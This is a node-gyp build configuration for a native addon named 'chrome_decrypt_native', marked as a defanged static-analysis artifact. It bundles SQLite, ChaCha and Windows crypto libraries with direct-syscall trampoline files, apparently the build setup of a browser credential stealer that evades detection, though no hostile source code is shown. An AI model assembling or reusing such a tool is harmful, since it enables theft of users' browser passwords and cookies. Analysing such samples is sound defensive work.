# DEFANGED: static-analysis cache — do not execute
{
  "targets": [
    {
      "target_name": "chrome_decrypt_native",
      "sources": [
        "src/binding.cpp",
        "src/crypto_wrapper.cpp",
        "libs/sqlite/sqlite3.c"
      ],
      "include_dirs": [
        "<!@(node -p \"require('node-addon-api').include\")",
        "libs/sqlite",
        "libs/chacha",
        "src"
      ],
      "dependencies": [
        "<!(node -p \"require('node-addon-api').gyp\")"
      ],
      "cflags!": [ "-fno-exceptions" ],
      "cflags_cc!": [ "-fno-exceptions" ],
      "defines": [
        "NAPI_DISABLE_CPP_EXCEPTIONS",
        "SQLITE_THREADSAFE=1",
        "SQLITE_ENABLE_FTS3",
        "SQLITE_ENABLE_FTS4",
        "SQLITE_ENABLE_FTS5",
        "SQLITE_ENABLE_RTREE",
        "SQLITE_ENABLE_JSON1"
      ],
      "conditions": [
        [
          "OS=='win'",
          {
            "sources": [
              "src/syscalls.cpp"
            ],
            "libraries": [
              "-lcrypt32.lib",
              "-lbcrypt.lib",
              "-lole32.lib",
              "-lshell32.lib",
              "-ladvapi32.lib"
            ],
            "defines": [
              "_WIN32_WINNT=0x0601",
              "WIN32_LEAN_AND_MEAN",
              "NOMINMAX"
            ],
            "msvs_settings": {
              "VCCLCompilerTool": {
                "ExceptionHandling": 1,
                "RuntimeLibrary": 2,
                "AdditionalOptions": [
                  "/std:c++17"
                ]
              },
              "VCLinkerTool": {
                "AdditionalOptions": [
                  "/DELAYLOAD:crypt32.dll",
                  "/DELAYLOAD:bcrypt.dll"
                ]
              }
            }
          }
        ],
        [
          "target_arch=='x64'",
          {
            "sources": [
              "src/syscall_trampoline_x64.asm"
            ],
            "conditions": [
              [
                "OS=='win'",
                {
                  "msvs_settings": {
                    "VCCLCompilerTool": {
                      "PreprocessorDefinitions": [
                        "ARCH_X64"
                      ]
                    }
                  }
                }
              ]
            ]
          }
        ],
        [
          "target_arch=='arm64'",
          {
            "sources": [
              "src/syscall_trampoline_arm64.asm"
            ],
            "conditions": [
              [
                "OS=='win'",
                {
                  "msvs_settings": {
                    "VCCLCompilerTool": {
                      "PreprocessorDefinitions": [
                        "ARCH_ARM64"
                      ]
                    }
                  }
                }
              ]
            ]
          }
        ]
      ]
    }
  ]
}
